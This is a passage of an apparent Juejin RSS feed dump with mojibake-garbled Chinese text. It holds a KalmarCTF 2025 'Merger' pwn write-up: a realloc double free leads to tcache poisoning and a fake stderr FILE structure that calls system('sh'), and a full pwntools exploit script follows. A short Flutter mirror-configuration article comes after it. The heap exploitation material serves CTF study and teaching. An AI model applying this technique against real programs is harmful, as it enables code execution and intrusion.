<span class="hljs-attr">payload</span> = payload.ljust(<span class="hljs-number">0</span>xa8,b<span class="hljs-string">"\x00"</span>)
add(26,0xa8,payload)
<span class="hljs-attr">fake_wide_vtable</span> = heapbase + <span class="hljs-number">0</span>x1770

<span class="hljs-comment">#fake_IO_wide_data(0xe8)</span>
<span class="hljs-attr">payload</span> = b<span class="hljs-string">'\x00'</span> * <span class="hljs-number">0</span>xe0 + p64(fake_wide_vtable)
add(25,0xe8,payload)
<span class="hljs-attr">fake_IO_wide_data</span>  = heapbase + <span class="hljs-number">0</span>x1670

<span class="hljs-comment">#fake stderr(0xe0)</span>
<span class="hljs-attr">fake_stderr</span>                = FileStructure(<span class="hljs-number">0</span>)
<span class="hljs-attr">fake_stderr.flags</span>          = u64(b<span class="hljs-string">'  sh\x00\x00\x00\x00'</span>)
<span class="hljs-attr">fake_stderr._IO_write_base</span> = <span class="hljs-number">0</span>
<span class="hljs-attr">fake_stderr._IO_write_ptr</span>  = <span class="hljs-number">1</span> <span class="hljs-comment"># _IO_write_ptr &gt; _IO_write_base</span>
<span class="hljs-attr">fake_stderr._wide_data</span>     = fake_IO_wide_data
<span class="hljs-attr">fake_stderr.vtable</span>         = libc.symbols[<span class="hljs-string">'_IO_wfile_jumps'</span>] + libcbase
<span class="hljs-attr">fake_stderr._lock</span>          = <span class="hljs-number">0</span>x205700 + libcbase <span class="hljs-comment">#_IO_stdfile_2_lock</span>
<span class="hljs-attr">fake_stderr_bytes</span> = bytes(fake_stderr)
</code></pre>
<h2 data-id="heading-1">ä¾‹é¢˜</h2>
<h3 data-id="heading-2">KalmarCTF 2025-Merger</h3>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1a0e2eafd01b4b96bec5b07f5d2e23ef~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6JqB5pmv572R5a6J5a6e6aqM5a6k:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764834263&amp;x-signature=H94Wc1TEyG2XVyfXdAAeIldOzkk%3D" alt="image-20251016101218782" loading="lazy"/></p>
<p>åœ¨<code>merge</code>åŠŸèƒ½ä¸­å †å—æ˜¯é€šè¿‡<code>realloc</code>å‡½æ•°å¯¹<code>src</code>ä¸<code>dst</code>å †å—è¿›è¡Œåˆå¹¶ï¼Œåˆå¹¶å®Œæˆä¹‹åï¼Œä½¿ç”¨<code>free</code>å‡½æ•°å¯¹<code>src</code>å †å—è¿›è¡Œé‡Šæ”¾ã€‚ä½†æ˜¯è¿™é‡Œå­˜åœ¨ä¸€ä¸ªæ¼æ´ç‚¹ï¼Œæ²¡æœ‰é™åˆ¶<code>src</code>ä¸<code>dst</code>å †å—çš„ä¸‹æ ‡ï¼Œä½¿å¾—<code>src</code>ä¸<code>dst</code>å †å—çš„ä¸‹æ ‡å¯ä»¥è®¾ç½®ä¸ºåŒä¸€ä¸ªå€¼ã€‚</p>
<p><code>realloc</code>å‡½æ•°åœ¨é‡æ–°åˆ†é…å †å—æ—¶ä¼šå‡ºç°ä»¥ä¸‹æƒ…å†µï¼š</p>
<ol>
<li>
<p>å½“é‡æ–°ç”³è¯·çš„å †å—çš„<code>size</code>å°äºå½“å‰å †å—çš„<code>size</code>ï¼Œåˆ™<code>realloc</code>ä¼šåˆ†å‰²å½“å‰å †å—</p>
</li>
<li>
<p>å½“é‡æ–°ç”³è¯·çš„å †å—çš„<code>size</code>å¤§äºå½“å‰å †å—çš„<code>size</code>ï¼Œåˆ™<code>realloc</code>ä¼šå…ˆ<code>free</code>å½“å‰å †å—ï¼Œå†<code>malloc</code>ç”³è¯·çš„<code>size</code></p>
</li>
</ol>
<p>ç»“åˆ<code>merage</code>åŠŸèƒ½ï¼Œå½“ä»¥æ¡ä»¶äºŒæ‰§è¡Œ<code>realloc</code>å‡½æ•°æ—¶ä¼šæ‰§è¡Œ<code>free(s)</code>å¹¶ç´§æ¥ç€æ‰§è¡Œ<code>free(src)</code>ï¼Œå› æ­¤å½“<code>s=src</code>æ—¶ï¼Œå°±ä¼šå¯¼è‡´<code>double free</code>æ¼æ´ã€‚</p>
<p>æƒ³è¦åˆ©ç”¨ä¸Šè¿°<code>double free</code>æ¼æ´ï¼Œåˆ™éœ€è¦æ»¡è¶³ä»¥ä¸‹æ¡ä»¶ï¼š</p>
<ul>
<li>
<p><code>realloc</code>ç”³è¯·çš„å †å—è¦æ¯”åˆå¹¶çš„å †å—å¤§ï¼ˆä»¥æ¡ä»¶äºŒæ–¹å¼æ‰§è¡Œ<code>realloc</code>å‡½æ•°ï¼‰</p>
</li>
<li>
<p><code>double free</code>çš„å †å—<code>size</code>éœ€è¦å°äº<code>0x100</code>ï¼Œå¦åˆ™ç”³è¯·ä¸åˆ°ï¼ˆ<code>add</code>åŠŸèƒ½æœ€å¤§åªèƒ½ç”³è¯·<code>0xff</code>å †å—ï¼‰</p>
</li>
</ul>
<p><strong>æ¼æ´åˆ©ç”¨æµç¨‹</strong></p>
<ul>
<li>
<p>è®¾ç½®<code>src</code>ä¸<code>dst</code>çš„ä¸‹æ ‡ä¸ºç›¸åŒå€¼</p>
</li>
<li>
<p>å°†<code>malloc(0xf7)</code>çš„å †å—æ”¾ç½®åœ¨<code>unsortbin</code>ä¸­ï¼Œç´§æ¥ç€<code>src</code>å †å—ä»<code>unsortbin</code>ä¸­ç”³è¯·ï¼Œè¿™æ ·å°±èƒ½å¤Ÿæ»¡è¶³<code>double free</code>çš„å †å—<code>size</code>å°äº<code>0x100</code></p>
</li>
<li>
<p>è‹¥<code>src</code>å †å—ä»<code>unsortbin</code>ä¸­ç”³è¯·ï¼Œå½“ä»¥æ¡ä»¶äºŒæ–¹å¼æ‰§è¡Œ<code>realloc</code>å‡½æ•°æ—¶åˆ™æ‰§è¡Œï¼š</p>
<ul>
<li>
<p><code>free(src)</code></p>
</li>
<li>
<p>è§¦å‘<code>unlink</code>ï¼Œ<code>src</code>å †å—åˆå¹¶å›<code>unsortbin</code></p>
</li>
</ul>
</li>
<li>
<p>ç´§æ¥ç€æ‰§è¡Œ<code>merge</code>å‡½æ•°çš„<code>free(src)</code>ï¼Œåˆ™<code>src</code>ä¼šæ”¾åœ¨<code>tcachebin</code>ä¸­ï¼Œåˆ™æ„é€ å‡º<code>uaf</code>æ¼æ´ï¼Œæ³„éœ²<code>libc</code>åœ°å€</p>
</li>
<li>
<p>åç»­å°†<code>src</code>å †å—æ”¾è¿›<code>fastbin</code>ä¸­ï¼Œæ„é€ <code>double free</code>æ¼æ´ï¼Œå½“ç›¸åº”å¤§å°çš„<code>tcachebin</code>è¢«ç”³è¯·å®Œæ¯•åï¼Œ<code>fastbin</code>ä¸­çš„å †å—ä¼šè¢«æ”¾ç½®åœ¨<code>tcachebin</code>ä¸­ï¼Œä»è€Œå˜ç›¸æ„é€ å‡º<code>Tcache Poisoning</code></p>
</li>
<li>
<p>åˆ©ç”¨<code>Tcache Poisoning</code>æŒ‡å‘å †å—ï¼ˆ<code>size</code>å¤§äº<code>0xe0</code>ï¼Œç”±äº<code>io_file</code>ç»“æ„ä½“éœ€è¦<code>0xe0</code>å¤§å°çš„ç©ºé—´ï¼‰</p>
</li>
<li>
<p>åˆ©ç”¨<code>io_file</code>è·å¾—<code>shell</code></p>
</li>
</ul>
<h4 data-id="heading-3">EXP</h4>
<pre><code class="hljs language-scss" lang="scss">from pwn import *

sh = <span class="hljs-built_in">process</span>("./merger")
libc = <span class="hljs-built_in">ELF</span>("/lib/x86_64-linux-gnu/libc.so.<span class="hljs-number">6</span>")
context<span class="hljs-selector-class">.update</span>(arch='amd64', os='linux', bits=<span class="hljs-number">64</span>) 

def <span class="hljs-built_in">add</span>(index,size,data):
    sh.<span class="hljs-built_in">recvuntil</span>(<span class="hljs-string">"&gt; "</span>)
    sh.<span class="hljs-built_in">sendline</span>(<span class="hljs-string">"1"</span>)
    sh.<span class="hljs-built_in">recvuntil</span>(<span class="hljs-string">"dex: "</span>)
    sh.<span class="hljs-built_in">sendline</span>(<span class="hljs-built_in">str</span>(index))
    sh.<span class="hljs-built_in">recvuntil</span>(<span class="hljs-string">"ize: "</span>)
    sh.<span class="hljs-built_in">sendline</span>(<span class="hljs-built_in">str</span>(size))
    sh.<span class="hljs-built_in">recvuntil</span>(<span class="hljs-string">"ta: "</span>)
    sh.<span class="hljs-built_in">send</span>(data)
    

def <span class="hljs-built_in">delete</span>(index):
    sh.<span class="hljs-built_in">recvuntil</span>(<span class="hljs-string">"&gt; "</span>)
    sh.<span class="hljs-built_in">sendline</span>(<span class="hljs-string">"2"</span>)
    sh.<span class="hljs-built_in">recvuntil</span>(<span class="hljs-string">"dex: "</span>)
    sh.<span class="hljs-built_in">sendline</span>(<span class="hljs-built_in">str</span>(index))


def <span class="hljs-built_in">show</span>(index):
    sh.<span class="hljs-built_in">recvuntil</span>(<span class="hljs-string">"&gt; "</span>)
    sh.<span class="hljs-built_in">sendline</span>(<span class="hljs-string">"3"</span>)
    sh.<span class="hljs-built_in">recvuntil</span>(<span class="hljs-string">"dex: "</span>)
    sh.<span class="hljs-built_in">sendline</span>(<span class="hljs-built_in">str</span>(index))

def <span class="hljs-built_in">merge</span>(dst,src):
    sh.<span class="hljs-built_in">recvuntil</span>(<span class="hljs-string">"&gt; "</span>)
    sh.<span class="hljs-built_in">sendline</span>(<span class="hljs-string">"4"</span>)
    sh.<span class="hljs-built_in">recvuntil</span>(<span class="hljs-string">"st: "</span>)
    sh.<span class="hljs-built_in">sendline</span>(<span class="hljs-built_in">str</span>(dst))
    sh.<span class="hljs-built_in">recvuntil</span>(<span class="hljs-string">"src: "</span>)
    sh.<span class="hljs-built_in">sendline</span>(<span class="hljs-built_in">str</span>(src))

for i in <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):
    <span class="hljs-built_in">add</span>(i,<span class="hljs-number">0</span>x87,<span class="hljs-number">0</span>x87*<span class="hljs-string">'a'</span>)
for i in <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):
    <span class="hljs-built_in">add</span>(i+<span class="hljs-number">7</span>,<span class="hljs-number">0</span>xf7,<span class="hljs-number">0</span>xf7*<span class="hljs-string">'a'</span>)
    
<span class="hljs-built_in">add</span>(<span class="hljs-number">14</span>,<span class="hljs-number">0</span>x87,<span class="hljs-number">0</span>x87*<span class="hljs-string">'a'</span>)
<span class="hljs-built_in">add</span>(<span class="hljs-number">15</span>,<span class="hljs-number">0</span>xf7,<span class="hljs-number">0</span>xf7*<span class="hljs-string">'a'</span>)
<span class="hljs-built_in">add</span>(<span class="hljs-number">16</span>,<span class="hljs-number">0</span>x98,<span class="hljs-number">0</span>x98*<span class="hljs-string">'a'</span>)

for i in <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):
    <span class="hljs-built_in">delete</span>(i+<span class="hljs-number">7</span>)
<span class="hljs-built_in">delete</span>(<span class="hljs-number">15</span>)
<span class="hljs-built_in">add</span>(<span class="hljs-number">14</span>,<span class="hljs-number">0</span>x87,<span class="hljs-number">0</span>x87*<span class="hljs-string">'a'</span>)

for i in <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):
    <span class="hljs-built_in">delete</span>(i)

for i in <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):
    <span class="hljs-built_in">add</span>(i,<span class="hljs-number">0</span>xf0,<span class="hljs-number">0</span>xf0*<span class="hljs-string">'a'</span>)

#å †å—åŒæ—¶é‡Šæ”¾åœ¨unsortbinä¸tcachebinä¸­
<span class="hljs-built_in">merge</span>(<span class="hljs-number">14</span>,<span class="hljs-number">14</span>)
sh.<span class="hljs-built_in">recvuntil</span>(<span class="hljs-string">"a"</span>*<span class="hljs-number">0</span>x87,drop=True)
libc_main_arena = <span class="hljs-built_in">u64</span>(sh.<span class="hljs-built_in">recv</span>(<span class="hljs-number">6</span>).<span class="hljs-built_in">ljust</span>(<span class="hljs-number">8</span>,b<span class="hljs-string">"\x00"</span>))
libcbase = libc_main_arena - <span class="hljs-number">0</span>x203b20
log.<span class="hljs-built_in">info</span>(<span class="hljs-string">"libcbase:"</span>+<span class="hljs-built_in">hex</span>(libcbase))
#ä¿®å¤unsortbin
payload = <span class="hljs-built_in">p64</span>(libc_main_arena)*<span class="hljs-number">2</span>
payload = payload.<span class="hljs-built_in">ljust</span>(<span class="hljs-number">0</span>xf0,b<span class="hljs-string">"a"</span>)
#å †å—<span class="hljs-number">20</span>ä¸å †å—<span class="hljs-number">21</span>æŒ‡å‘åŒä¸€ä¸ªå †å—ï¼Œä¸€ä¸ªä»tcachebinä¸­ç”³è¯·ï¼Œä¸€ä¸ªä»unsortbinä¸­ç”³è¯·
<span class="hljs-built_in">add</span>(<span class="hljs-number">20</span>,<span class="hljs-number">0</span>xf0,payload)
<span class="hljs-built_in">add</span>(<span class="hljs-number">21</span>,<span class="hljs-number">0</span>x77,<span class="hljs-string">'a'</span>*<span class="hljs-number">0</span>x77)
<span class="hljs-built_in">add</span>(<span class="hljs-number">22</span>,<span class="hljs-number">0</span>x77,<span class="hljs-string">'a'</span>*<span class="hljs-number">0</span>x77)

for i in <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):
    <span class="hljs-built_in">add</span>(i,<span class="hljs-number">0</span>x77,<span class="hljs-number">0</span>x77*<span class="hljs-string">'a'</span>)
for i in <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):
    <span class="hljs-built_in">delete</span>(i)
<span class="hljs-built_in">delete</span>(<span class="hljs-number">21</span>)
<span class="hljs-built_in">show</span>(<span class="hljs-number">20</span>)  #uafæ³„éœ²æ•°æ®
heapbase = <span class="hljs-built_in">u64</span>(sh.<span class="hljs-built_in">recvuntil</span>(<span class="hljs-string">"\n"</span>,drop=True).<span class="hljs-built_in">ljust</span>(<span class="hljs-number">8</span>,b<span class="hljs-string">"\x00"</span>))&lt;&lt;<span class="hljs-number">12</span>
log.<span class="hljs-built_in">info</span>(<span class="hljs-string">"heapbase:"</span>+<span class="hljs-built_in">hex</span>(heapbase))
#fastbin double free
<span class="hljs-built_in">delete</span>(<span class="hljs-number">22</span>)
<span class="hljs-built_in">delete</span>(<span class="hljs-number">20</span>)

for i in <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):
    <span class="hljs-built_in">add</span>(i,<span class="hljs-number">0</span>x77,<span class="hljs-number">0</span>x77*<span class="hljs-string">'a'</span>)
for i in <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):
    <span class="hljs-built_in">add</span>(i+<span class="hljs-number">7</span>,<span class="hljs-number">0</span>xf7,<span class="hljs-number">0</span>xf7*<span class="hljs-string">'a'</span>)
for i in <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):
    <span class="hljs-built_in">delete</span>(i+<span class="hljs-number">7</span>)
#<span class="hljs-number">0</span>x77çš„å †å—å¤§å°ä¸è¶³ä»¥å­˜å‚¨IO_Fileç»“æ„ä½“ï¼Œå› æ­¤éœ€è¦åˆ©ç”¨Tcache PoisoningæŒ‡å‘<span class="hljs-number">0</span>x100çš„å †å—
payload = <span class="hljs-built_in">p64</span>((heapbase + <span class="hljs-number">0</span>x1670) ^ (heapbase&gt;&gt;<span class="hljs-number">12</span>))
payload = payload.<span class="hljs-built_in">ljust</span>(<span class="hljs-number">0</span>x77,b<span class="hljs-string">"a"</span>)
<span class="hljs-built_in">add</span>(<span class="hljs-number">20</span>,<span class="hljs-number">0</span>x77,payload)
<span class="hljs-built_in">add</span>(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>x77,<span class="hljs-string">'a'</span>*<span class="hljs-number">0</span>x77)
<span class="hljs-built_in">add</span>(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>x77,<span class="hljs-string">'a'</span>*<span class="hljs-number">0</span>x77)
#åˆ©ç”¨Tcache PoisoningæŒ‡å‘_IO_2_1_stderr_
payload = <span class="hljs-built_in">p64</span>((libcbase + libc.symbols[<span class="hljs-string">'_IO_2_1_stderr_'</span>]) ^ (heapbase+<span class="hljs-number">0</span>x1000&gt;&gt;<span class="hljs-number">12</span>))
payload = payload.<span class="hljs-built_in">ljust</span>(<span class="hljs-number">0</span>x77,b<span class="hljs-string">"a"</span>)
<span class="hljs-built_in">add</span>(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>x77,payload)

#<span class="hljs-built_in">fake_wide_vtable</span>(<span class="hljs-number">0</span>xa8)
payload  = b<span class="hljs-string">'\x00'</span>*<span class="hljs-number">0</span>x68 + <span class="hljs-built_in">p64</span>(libcbase + libc.symbols[<span class="hljs-string">'system'</span>])
payload = payload.<span class="hljs-built_in">ljust</span>(<span class="hljs-number">0</span>xa8,b<span class="hljs-string">"\x00"</span>)
<span class="hljs-built_in">add</span>(<span class="hljs-number">26</span>,<span class="hljs-number">0</span>xa8,payload)
fake_wide_vtable = heapbase + <span class="hljs-number">0</span>x1770

#<span class="hljs-built_in">fake_IO_wide_data</span>(<span class="hljs-number">0</span>xe8)
payload = b<span class="hljs-string">'\x00'</span> * <span class="hljs-number">0</span>xe0 + <span class="hljs-built_in">p64</span>(fake_wide_vtable)
<span class="hljs-built_in">add</span>(<span class="hljs-number">25</span>,<span class="hljs-number">0</span>xe8,payload)
fake_IO_wide_data  = heapbase + <span class="hljs-number">0</span>x1670

#fake <span class="hljs-built_in">stderr</span>(<span class="hljs-number">0</span>xe0)
fake_stderr                = <span class="hljs-built_in">FileStructure</span>(<span class="hljs-number">0</span>)
fake_stderr.flags          = <span class="hljs-built_in">u64</span>(b<span class="hljs-string">'  sh\x00\x00\x00\x00'</span>)
fake_stderr._IO_write_base = <span class="hljs-number">0</span>
fake_stderr._IO_write_ptr  = <span class="hljs-number">1</span> # _IO_write_ptr &gt; _IO_write_base
fake_stderr._wide_data     = fake_IO_wide_data
fake_stderr.vtable         = libc.symbols[<span class="hljs-string">'_IO_wfile_jumps'</span>] + libcbase
fake_stderr._lock          = <span class="hljs-number">0</span>x205700 + libcbase #_IO_stdfile_2_lock
fake_stderr_bytes = <span class="hljs-built_in">bytes</span>(fake_stderr)
<span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(fake_stderr_bytes)))
<span class="hljs-built_in">add</span>(<span class="hljs-number">2</span>,<span class="hljs-number">0</span>xf0,fake_stderr_bytes+<span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>xfbad2887)+b<span class="hljs-string">"\n"</span>)
sh.<span class="hljs-built_in">interactive</span>()
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Flutter é…ç½®å›½å†…é•œåƒï¼ŒåŠ é€Ÿé¡¹ç›®åŠ è½½ï¼]]></title>    <link>https://juejin.cn/post/7576955345379442751</link>    <guid>https://juejin.cn/post/7576955345379442751</guid>    <pubDate>2025-11-27T07:40:47.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576955345379442751" data-draft-id="7576994308274094099" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Flutter é…ç½®å›½å†…é•œåƒï¼ŒåŠ é€Ÿé¡¹ç›®åŠ è½½ï¼"/> <meta itemprop="keywords" content="Flutter"/> <meta itemprop="datePublished" content="2025-11-27T07:40:47.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å‰ç«¯å°ä¼™è®¡"/> <meta itemprop="url" content="https://juejin.cn/user/430664289630157"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Flutter é…ç½®å›½å†…é•œåƒï¼ŒåŠ é€Ÿé¡¹ç›®åŠ è½½ï¼
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/430664289630157/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å‰ç«¯å°ä¼™è®¡
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-27T07:40:47.000Z" title="Thu Nov 27 2025 07:40:47 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-27
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0">Flutter è¿è¡Œé…ç½®</h3>
<p>Flutteré¡¹ç›®åˆ›å»ºåï¼Œè®¾ç½®å›½å†…é•œåƒåœ°å€ã€‚</p>
<h5 data-id="heading-1">1.å›½å†…ä½¿ç”¨é˜¿é‡Œåœ°å€</h5>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-comment">// æ–‡ä»¶ä½ç½® android/build.gradle</span>

buildscript {
    repositories {
        maven { url <span class="hljs-symbol">'https</span>:<span class="hljs-comment">//maven.aliyun.com/repository/central/' }</span>
        maven { url <span class="hljs-symbol">'https</span>:<span class="hljs-comment">//maven.aliyun.com/repository/public/' }</span>
        maven { url <span class="hljs-symbol">'https</span>:<span class="hljs-comment">//maven.aliyun.com/repository/gradle-plugin/' }</span>
        maven { url <span class="hljs-symbol">'https</span>:<span class="hljs-comment">//maven.aliyun.com/repository/apache-snapshots/' }</span>
        maven { url <span class="hljs-symbol">'https</span>:<span class="hljs-comment">//maven.aliyun.com/repository/google/' }</span>
    }
}

allprojects {
    repositories {
        maven { url <span class="hljs-symbol">'https</span>:<span class="hljs-comment">//maven.aliyun.com/repository/central/' }</span>
        maven { url <span class="hljs-symbol">'https</span>:<span class="hljs-comment">//maven.aliyun.com/repository/public/' }</span>
        maven { url <span class="hljs-symbol">'https</span>:<span class="hljs-comment">//maven.aliyun.com/repository/gradle-plugin/' }</span>
        maven { url <span class="hljs-symbol">'https</span>:<span class="hljs-comment">//maven.aliyun.com/repository/apache-snapshots/' }</span>
        maven { url <span class="hljs-symbol">'https</span>:<span class="hljs-comment">//maven.aliyun.com/repository/google/' }</span>
    }
}
</code></pre>
<h5 data-id="heading-2">2.æŒ‡å®šé¡¹ç›®javaåœ°å€ï¼ˆæœ‰äº›android studio è®¾ç½®äº†javaç‰ˆæœ¬ä»ä¸èƒ½èƒ½å¸¸ä½¿ç”¨ï¼‰</h5>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">// æ–‡ä»¶ä½ç½® android/gradle.properties</span>

org.gradle.java.home=D:\\Android\\G18
</code></pre>
<h5 data-id="heading-3">3.ä½¿ç”¨å›½å†…é•œåƒä¸‹è½½ gradle</h5>
<pre><code class="hljs language-ruby" lang="ruby">/<span class="hljs-regexp">/ æ–‡ä»¶ä½ç½® android/gradle</span><span class="hljs-regexp">/wrapper/gradle</span>-wrapper.properties

distributionUrl=https\<span class="hljs-symbol">://mirrors</span>.cloud.tencent.com/gradle/gradle-<span class="hljs-number">7.5</span>-all.zip
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å‘Šåˆ«â€œé»‘ç›’â€ç­‰å¾…ï¼šå¦‚ä½•åœ¨ LangGraph ä¸­ä¼˜é›…åœ°å®ç°å‰ç«¯å‹å¥½çš„ Human-in-the-Loopï¼Ÿ]]></title>    <link>https://juejin.cn/post/7576969229984923688</link>    <guid>https://juejin.cn/post/7576969229984923688</guid>    <pubDate>2025-11-27T07:29:59.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576969229984923688" data-draft-id="7576936862633361408" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" 